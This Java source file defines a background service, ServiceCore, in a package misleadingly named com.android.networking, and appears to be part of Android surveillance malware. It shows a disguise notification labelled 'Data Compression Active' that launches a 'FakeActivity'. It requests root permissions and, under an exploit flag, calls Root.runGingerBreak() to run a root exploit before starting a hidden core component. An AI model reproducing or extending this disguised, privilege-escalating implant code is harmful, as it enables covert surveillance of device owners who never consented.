package com.android.networking;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.res.Configuration;
import android.os.IBinder;
import android.widget.Toast;

import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;

/**
 * The Class ServiceCore.
 */
public class ServiceCore extends Service {
	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
	private boolean needsNotification = false;
	private Core core;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		Messages.init(getApplicationContext());

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("32.1"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
		
		needsNotification = Root.isNotificationNeeded();

		Status.setAppContext(getApplicationContext());

		// E' sempre false se Cfg.ACTIVITY = false
		if (needsNotification == true) {
			Notification note = new Notification(R.drawable.notify_icon, "Data Compression Active",
					System.currentTimeMillis());

			Intent i = new Intent(this, FakeActivity.class);

			i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);

			PendingIntent pi = PendingIntent.getActivity(this, 0, i, 0);

			// Activity Name and Displayed Text
			note.flags |= Notification.FLAG_AUTO_CANCEL;
			note.setLatestEventInfo(this, "", "", pi);

			startForeground(1260, note);
		}
	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
		
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onStart)"); //$NON-NLS-1$
			
		}

		Root.getPermissions();

		if (Cfg.EXP) {
			Root.runGingerBreak();
		}

		// Core starts	
		core = Core.getInstance();
		core.Start(this.getResources(), getContentResolver());
	}

	@Override
	public void onConfigurationChanged(Configuration newConfig) {
		super.onConfigurationChanged(newConfig);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onConfigurationChanged)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("36.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
	}

	@Override
	public void onLowMemory() {
		super.onLowMemory();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onLowMemory)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("36.4"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
	}

	@Override
	public void onRebind(Intent intent) {
		super.onRebind(intent);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onRebind)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("36.5"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
	}

	@Override
	public boolean onUnbind(Intent intent) {
		boolean ret = super.onUnbind(intent);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onUnbind)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("36.6"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}

		return ret;
	}

	@Override
	public void onDestroy() {
		super.onDestroy();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, Messages.getString("32.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}

		core.Stop();
		core = null;

		if (needsNotification == true) {
			stopForeground(true);
		}
	}

}
